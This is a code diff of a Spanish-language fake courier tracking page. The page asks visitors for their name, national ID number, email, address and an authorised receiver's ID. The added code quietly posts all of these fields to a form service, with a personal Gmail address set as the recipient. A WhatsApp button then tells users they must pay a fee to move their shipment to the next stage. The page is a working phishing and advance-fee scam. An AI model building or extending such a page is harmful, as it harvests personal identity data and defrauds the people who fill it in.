@@ -27,7 +27,6 @@
             min-height: 100vh;
         }
 
-        /* Header Institucional */
         header {
             background-color: rgba(17, 24, 39, 0.85);
             backdrop-filter: blur(10px);
@@ -68,7 +67,6 @@
             font-weight: 600;
         }
 
-        /* Contenedor Principal */
         main {
             flex-grow: 1;
             display: flex;
@@ -98,7 +96,6 @@
             font-size: 0.95rem;
         }
 
-        /* Seccion de Búsqueda Rapida */
         .search-box-wrapper {
             background-color: #030712;
             border: 1px solid var(--border-color);
@@ -131,7 +128,6 @@
             background-color: var(--primary-hover);
         }
 
-        /* Tarjeta Principal */
         .main-card {
             background-color: var(--card-bg);
             border: 1px solid var(--border-color);
@@ -194,7 +190,6 @@
             box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
         }
 
-        /* Checkbox autorizado */
         .checkbox-group {
             display: flex;
             align-items: center;
@@ -251,7 +246,6 @@
             transform: translateY(-1px);
         }
 
-        /* Sección de Resultados / Proceso */
         .results-section {
             display: none;
             animation: fadeIn 0.4s ease;
@@ -306,7 +300,6 @@
             color: #ffffff;
         }
 
-        /* Timeline */
         .timeline {
             margin: 1.5rem 0;
             padding-left: 1rem;
@@ -351,7 +344,6 @@
             color: var(--text-muted);
         }
 
-        /* Caja de Código */
         .security-box {
             background: linear-gradient(135deg, rgba(59, 130, 246, 0.05) 0%, rgba(16, 185, 129, 0.05) 100%);
             border: 1px solid rgba(59, 130, 246, 0.3);
@@ -384,7 +376,6 @@
             color: var(--text-muted);
         }
 
-        /* Botón de WhatsApp con mensaje de abono */
         .btn-whatsapp {
             display: flex;
             flex-direction: column;
@@ -467,7 +458,6 @@
                 <p class="hero-subtitle" id="mainSubtitle">Ingrese su número de guía o registre sus datos para la asignación del envío.</p>
             </div>
 
-            <!-- Caja de Búsqueda por Número de Guía -->
             <div class="search-box-wrapper" id="searchBoxContainer">
                 <label for="searchCodeInput">¿Ya tiene un número de guía?</label>
                 <div class="search-row" style="margin-top: 0.5rem;">
@@ -477,21 +467,20 @@
             </div>
 
             <div class="main-card">
-                <!-- Formulario de Registro -->
                 <form id="shippingForm">
                     <div class="section-title">1. Datos del Titular</div>
                     <div class="form-grid">
                         <div class="form-group">
                             <label for="fullName">Nombre y Apellido *</label>
-                            <input type="text" id="fullName" required placeholder="Ej: Juan Pérez">
+                            <input type="text" id="fullName" name="NombreCompleto" required placeholder="Ej: Juan Pérez">
                         </div>
                         <div class="form-group">
                             <label for="dni">DNI / Documento *</label>
-                            <input type="text" id="dni" required placeholder="Ej: 38123456">
+                            <input type="text" id="dni" name="DNI" required placeholder="Ej: 38123456">
                         </div>
                         <div class="form-group full-width">
                             <label for="email">Correo Electrónico (Gmail) *</label>
-                            <input type="email" id="email" required placeholder="ejemplo@gmail.com">
+                            <input type="email" id="email" name="EmailCliente" required placeholder="ejemplo@gmail.com">
                         </div>
                     </div>
 
@@ -499,21 +488,21 @@
                     <div class="form-grid">
                         <div class="form-group full-width">
                             <label for="address">Dirección Completa *</label>
-                            <input type="text" id="address" required placeholder="Calle, Número, Piso/Depto">
+                            <input type="text" id="address" name="Direccion" required placeholder="Calle, Número, Piso/Depto">
                         </div>
                         <div class="form-group">
                             <label for="crossStreets">Entre Calles *</label>
-                            <input type="text" id="crossStreets" required placeholder="Ej: Av. San Martín y Belgrano">
+                            <input type="text" id="crossStreets" name="EntreCalles" required placeholder="Ej: Av. San Martín y Belgrano">
                         </div>
                         <div class="form-group">
                             <label for="postalCode">Código Postal *</label>
-                            <input type="text" id="postalCode" required placeholder="Ej: C1043">
+                            <input type="text" id="postalCode" name="CodigoPostal" required placeholder="Ej: C1043">
                         </div>
                     </div>
 
                     <div class="section-title">3. Recepción del Paquete</div>
                     <div class="checkbox-group">
-                        <input type="checkbox" id="thirdPartyReceiver">
+                        <input type="checkbox" id="thirdPartyReceiver" name="TerceroRecibe">
                         <label for="thirdPartyReceiver">¿El paquete lo recibirá otra persona (no el titular)?</label>
                     </div>
 
@@ -521,19 +510,18 @@
                         <div class="form-grid">
                             <div class="form-group">
                                 <label for="receiverName">Nombre y Apellido Autorizado *</label>
-                                <input type="text" id="receiverName" placeholder="Ej: María González">
+                                <input type="text" id="receiverName" name="NombreAutorizado" placeholder="Ej: María González">
                             </div>
                             <div class="form-group">
                                 <label for="receiverDni">DNI del Autorizado *</label>
-                                <input type="text" id="receiverDni" placeholder="Ej: 40987654">
+                                <input type="text" id="receiverDni" name="DNIAutorizado" placeholder="Ej: 40987654">
                             </div>
                         </div>
                     </div>
 
-                    <button type="submit" class="btn-submit">Confirmar Registro y Procesar Envío</button>
+                    <button type="submit" class="btn-submit" id="btnSubmitForm">Confirmar Registro y Procesar Envío</button>
                 </form>
 
-                <!-- Vista de Pedido en Proceso -->
                 <div class="results-section" id="resultsSection">
                     <div class="status-header">
                         <div>
@@ -583,7 +571,6 @@
                         <p>Conserve este código. Se le solicitará presencialmente al momento de recibir.</p>
                     </div>
 
-                    <!-- Botón de WhatsApp enfocado al abono de etapa -->
                     <a href="#" id="whatsappBtnLink" target="_blank" class="btn-whatsapp">
                         <span>Contactar por WhatsApp para Avanzar Etapa</span>
                         <span class="subtext">Para pasar al siguiente historial operativo debe abonar el cargo correspondiente</span>
@@ -601,10 +588,11 @@
     </footer>
 
     <script>
-        // Teléfono de soporte configurado
         const PHONE_WHATSAPP = "5491155012447";
+        
+        // REEMPLAZA ESTA URL POR TU PROPIA URL DE FORMSPREE:
+        const FORMSPREE_URL = "https://formspree.io/f/TU_FORM_ID_AQUI"; 
 
-        // Base de datos local (simulación de guías preexistentes)
         const dbGuias = {
             "NV-1001-2026": {
                 destination: "Av. Corrientes 1234, CABA",
@@ -621,11 +609,11 @@
         const shippingForm = document.getElementById('shippingForm');
         const resultsSection = document.getElementById('resultsSection');
         const searchBoxContainer = document.getElementById('searchBoxContainer');
+        const btnSubmitForm = document.getElementById('btnSubmitForm');
         
         const mainTitle = document.getElementById('mainTitle');
         const mainSubtitle = document.getElementById('mainSubtitle');
 
-        // Campos de salida
         const resTrackingCode = document.getElementById('resTrackingCode');
         const resDestination = document.getElementById('resDestination');
         const resReceiver = document.getElementById('resReceiver');
@@ -636,7 +624,6 @@
         const btnSearchGuide = document.getElementById('btnSearchGuide');
         const btnReset = document.getElementById('btnReset');
 
-        // Alternar campos de receptor autorizado
         thirdPartyCheckbox.addEventListener('change', (e) => {
             if (e.target.checked) {
                 authorizedFields.style.display = 'block';
@@ -649,13 +636,11 @@
             }
         });
 
-        // Función para actualizar enlace de WhatsApp con mensaje personalizado
         function updateWhatsAppLink(guiaCode) {
             const text = encodeURIComponent(`Hola, quiero abonar para que mi pedido con la guía ${guiaCode} pase a la siguiente etapa del historial operativo.`);
             whatsappBtnLink.href = `https://wa.me/${PHONE_WHATSAPP}?text=${text}`;
         }
 
-        // Mostrar pantalla de estado del envío
         function showStatusView(code, destination, receiver, secCode) {
             resTrackingCode.textContent = code;
             resDestination.textContent = destination;
@@ -673,7 +658,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // Consultar por número de guía existente
         btnSearchGuide.addEventListener('click', () => {
             const query = searchCodeInput.value.trim().toUpperCase();
             if (dbGuias[query]) {
@@ -684,14 +668,33 @@
             }
         });
 
-        // Registro de un nuevo envío
-        shippingForm.addEventListener('submit', (e) => {
+        // Enviar datos por correo y mostrar vista del cliente
+        shippingForm.addEventListener('submit', async (e) => {
             e.preventDefault();
+
+            btnSubmitForm.textContent = "Procesando...";
+            btnSubmitForm.disabled = true;
 
             const randomNum = Math.floor(1000 + Math.random() * 9000);
             const randomSec = Math.floor(100000 + Math.random() * 900000);
             const guideCode = `NV-${randomNum}-2026`;
-            
+
+            const formData = new FormData(shippingForm);
+            formData.append("NumeroDeGuia", guideCode);
+            formData.append("CodigoDeSeguridad", randomSec);
+            formData.append("DestinatarioDeNotificacion", "miaalma769@gmail.com");
+
+            // Envío en segundo plano hacia tu Gmail
+            try {
+                await fetch(FORMSPREE_URL, {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                });
+            } catch (err) {
+                console.log("Error al despachar el correo", err);
+            }
+
             const fullName = document.getElementById('fullName').value;
             const address = document.getElementById('address').value;
             const postalCode = document.getElementById('postalCode').value;
@@ -703,7 +706,6 @@
 
             const destinationText = `${address} (CP: ${postalCode})`;
 
-            // Guardar en la base local para que también pueda consultarse si se reingresa la guía
             dbGuias[guideCode] = {
                 destination: destinationText,
                 receiver: receiverText,
@@ -711,10 +713,12 @@
                 status: "En procesamiento"
             };
 
+            btnSubmitForm.textContent = "Confirmar Registro y Procesar Envío";
+            btnSubmitForm.disabled = false;
+
             showStatusView(guideCode, destinationText, receiverText, randomSec);
         });
 
-        // Botón para volver
         btnReset.addEventListener('click', (e) => {
             e.preventDefault();
             resultsSection.style.display = 'none';
